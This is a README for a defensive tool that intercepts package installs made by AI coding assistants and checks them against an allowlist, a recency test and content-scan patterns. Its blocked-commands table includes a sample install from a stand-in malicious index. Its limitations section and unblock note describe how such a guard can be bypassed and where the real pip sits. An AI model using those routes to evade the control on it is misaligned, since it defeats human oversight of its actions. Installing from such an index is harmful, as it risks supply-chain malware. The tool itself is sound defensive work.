# package-guard

Stops AI coding assistants from installing unverified Python packages.

When someone uses Claude Code, Codex, or Gemini to build software, the AI will `pip install` whatever it thinks is needed — no verification, no review. In March 2026, the [TeamPCP campaign](https://www.aikido.dev/blog/telnyx-pypi-compromised-teampcp-canisterworm) compromised LiteLLM (95M downloads/month) and Telnyx (742K downloads/month) on PyPI with backdoored versions. Any AI assistant that suggested those packages during the attack window would have installed malware.

package-guard intercepts package installs before they execute, checks them against an allowlist and multiple verification signals, and blocks anything that doesn't pass.

## What it does

Every `pip install` command — whether from an AI tool, a terminal, a venv, or `python -m pip` — gets intercepted and verified:

- **Allowlist**: Is this package approved? (`STRICT=1` blocks everything not on the list)
- **Recency**: Was this version published in the last 14 days? (Most supply chain attacks are caught within days)
- **Content scan**: Does the package source contain suspicious patterns? (`b64decode` + `exec`, `wave.open` + `readframes`, etc.)
- **Source blocking**: `-r requirements.txt`, local wheels, `git+https://`, `--index-url`, editable installs — all blocked by default

If verification fails, the install is blocked and the AI gets a scrubbed error message with no file paths or bypass hints.

## Quick start

```bash
git clone https://github.com/zachcampbell/package-guard.git
cd package-guard

# System-wide (requires sudo, protects all users):
./install.sh --all

# Or user-mode (no sudo, protects your AI tools):
./install.sh --user
```

That's it. Restart your AI CLI sessions and they'll pick up the hooks.

Run `./install.sh --test` to verify, or `./tests/run-corpus.sh` for the full 64-command adversarial test suite.

## How it works

Three layers, each independent:

**Hooks** — Claude Code (`PreToolUse`), Codex CLI (`PreToolUse`), and Gemini CLI (`BeforeTool`) hooks intercept Bash/shell commands before execution. If the command contains a package install, the hook runs verification and returns a structured deny that the AI sees as feedback.

**Wrappers** — Drop-in replacements for `pip` and `python3` that sit earlier in PATH. The pip wrapper catches direct pip calls. The python3 wrapper catches `python3 -m pip install` and also injects the pip wrapper into new venvs automatically (so `.venv/bin/pip install` is also covered).

**Policy** — A single config file (`policy.conf`) controls all behavior. In system mode it's root-owned and can't be modified by the AI or the user. Environment variables don't override it.

An optional fourth layer: deploy a [Nexus CE](https://help.sonatype.com/en/sonatype-nexus-repository.html) package proxy for network-level enforcement that nothing client-side can bypass.

## Install modes

| | `--all` (system) | `--user` |
|---|---|---|
| Scripts | `/opt/package-verify/` | `~/.local/share/package-verify/` |
| Wrappers | `/usr/local/bin/` | `~/.local/bin/` |
| Requires sudo | Yes | No |
| AI can remove it | No (root-owned) | Technically yes, but they'd have to find it |
| Best for | Org-wide lockdown | Individual devs, non-technical users |

## Configuration

Everything lives in `policy.conf` inside the install directory:

```ini
STRICT=0          # Recency is primary defense; set to 1 for allowlist enforcement
FAIL_CLOSED=1     # Block if verification can't complete (network errors, etc.)
MAX_AGE_HOURS=336 # Flag packages published within 14 days
SKIP_RECENCY=0    # Don't skip the recency check
SKIP_CONTENT=0    # Don't skip the content scan
```

The allowlist is a plain text file next to it — one package per line, optional `==version` pins.

```
requests
flask
pydantic
openai==1.82.0
```

## What gets blocked

| Install method | Blocked? | Why |
|---|---|---|
| `pip install litellm` | Yes | Not on allowlist / content scan flags it |
| `pip install -r requirements.txt` | Yes | Requirements files bypass per-package verification |
| `pip install -e .` | Yes | Editable installs bypass verification |
| `pip install ./thing.whl` | Yes | Local files bypass verification |
| `pip install --index-url https://evil.com pkg` | Yes | Custom indexes could serve tampered packages |
| `pip install git+https://...` | Yes | VCS installs bypass verification |
| `.venv/bin/pip install litellm` | Yes | Venv pip is automatically replaced with the wrapper |
| `python3 -m pip install litellm` | Yes | python3 wrapper intercepts this |
| `STRICT=0 pip install litellm` | Yes | Env vars can't override policy.conf |
| `pip install requests` | No (allowed) | On the allowlist, passes all checks |
| `pip list` / `pip freeze` | No (passes through) | Not an install command |

To unblock a package, add it to the allowlist. To unblock `-r` or `-e`, use the real pip directly (the path is intentionally not in the error message — ask your admin or find the `.pv-*-delegate` in the venv's bin/).

## Ecosystem coverage

PyPI has full enforcement (allowlist, recency, content scan, source blocking). npm gets allowlist + recency across `npm install`, `npx`, `yarn add`, `pnpm add`, and `bun add`. Cargo gets allowlist only. For full coverage across all ecosystems, use a network-level package proxy.

## Tested against

The TeamPCP packages that were live on PyPI during the March 2026 attack:
- **litellm** — blocked by content scan (`b64decode` + `exec` co-occurrence)
- **telnyx** — blocked by recency check (published 27 hours before test)

Also: 64 adversarial command patterns tested across all three AI tool hooks, including venv paths, base64-encoded commands, env var bypass attempts, compound shell commands, and alternative install methods. Full corpus in `tests/adversarial-corpus.txt`.

## Known limitations

The hooks work by pattern-matching command strings. Anything that hides `pip install` from the literal command — base64 encoding, Python subprocess calls, `pipx`, `poetry`, writing a script to disk — can bypass the hook layer. The pip wrapper catches most of these (if the pip binary is invoked), but programmatic pip calls through Python (`from pip._internal import...`) bypass both.

This is effective against the real threat: AI tools that generate straightforward `pip install` commands for non-technical users. It is not a sandbox. For that, use a network-level proxy.

## Platform support

Linux and macOS. Windows needs WSL or Git Bash for the hooks. Codex CLI hooks are disabled on Windows as of v0.116.0.

macOS uses POSIX-compatible utilities throughout — no GNU-specific flags.

## Uninstall

```bash
./install.sh --uninstall
```

Removes everything except the allowlist and config backups.
